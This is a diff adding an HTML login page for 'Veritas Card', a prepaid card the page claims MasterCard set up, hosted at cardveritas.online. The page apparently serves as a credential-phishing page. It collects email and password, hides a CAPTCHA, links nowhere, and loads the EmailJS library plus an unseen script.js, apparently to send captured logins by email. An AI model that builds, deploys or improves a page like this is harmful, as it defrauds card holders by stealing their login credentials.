@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- SEO -->
+<title>Veritas Card</title>
+
+<meta name="description"
+      content="Veritas card: Veritas Card est une solution de carte de paiement prépayée sans banque mise en place par MasterCard, .">
+
+<meta name="robots" content="index, follow">
+<meta name="googlebot" content="index, follow">
+
+<link rel="canonical" href="https://cardveritas.online/">
+
+<!-- Open Graph -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="Veritas Card">
+<meta property="og:description"
+      content="Accédez à votre espace Veritas Card.">
+<meta property="og:url" content="https://cardveritas.online/">
+<meta property="og:site_name" content="Veritas Card login">
+<meta property="og:image" content="https://cardveritas.online/logo.jpg">
+
+<!-- Twitter / X -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Veritas Card | Login">
+<meta name="twitter:description"
+      content="connecter a un compte Veritas Card ">
+<meta name="twitter:image" content="https://cardveritas.online/logo.jpg">
+
+
+<link rel="icon" type="image/png" href="logo1.png">
+
+<!-- JSON-LD -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "Veritas Card",
+  "url": "https://cardveritas.online/",
+  "description": "Veritas Card - espace en ligne",
+  "inLanguage": "fr"
+}
+</script>
+
+<link rel="stylesheet" href="styles.css">
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+</head>
+
+<body>
+
+  <div class="card">
+
+    <div class="brand">
+      <img src="logo.jpg" alt="Logo Yanick">
+
+      <span class="brand-text">
+        <span class="brand-name">veritas</span>
+        <span class="brand-sub">card</span>
+      </span>
+    </div>
+
+    <h1>Login</h1>
+
+    <div class="banner">
+      <p>
+         Check your login details and&mdash;never share them with anyone.
+        <a href="#">page contact</a>.
+      </p>
+
+      <div class="lang-toggle">
+        <button class="active" type="button">FR</button>
+        <button type="button">EN</button>
+      </div>
+    </div>
+
+    <form id="signupForm">
+
+      <div class="field">
+        <input
+          type="email"
+          id="email"
+          placeholder="email"
+          maxlength="50"
+          aria-label="email"
+          required>
+      </div>
+
+      <div class="field">
+        <input
+          type="password"
+          id="password"
+          placeholder="password"
+          minlength="8"
+          maxlength="20"
+          aria-label="password"
+          required>
+      </div>
+
+      <!-- CAPTCHA caché au départ -->
+      <div id="captcha-container" style="display: none;">
+        <div
+          class="g-recaptcha"
+          data-sitekey="6Ld5M7ktAAAAAHxlGnB7OXvhRCpEhzFZqO2PwLGv">
+        </div>
+      </div>
+
+      <div class="button-container">
+
+        <!-- Vrai déclencheur SUBMIT -->
+        <button
+          type="submit"
+          class="signin-btn"
+          id="signin-btn">
+          Sign In
+        </button>
+
+      </div>
+
+      <div id="result"></div>
+
+      <div class="forgot">
+        <a href="#">Forgotten Password?</a>
+      </div>
+
+      <div class="mini-links">
+
+        <div class="box">
+          Email issue? <a href="#">Click here</a>
+        </div>
+
+        <div class="box">
+          Sign Up <a href="#">Click here</a>
+        </div>
+
+      </div>
+
+      <button type="button" class="corporate-btn">
+        Corporate or Business Account?
+      </button>
+
+    </form>
+
+  </div>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script src="script.js"></script>
+
+</body>
+</html>
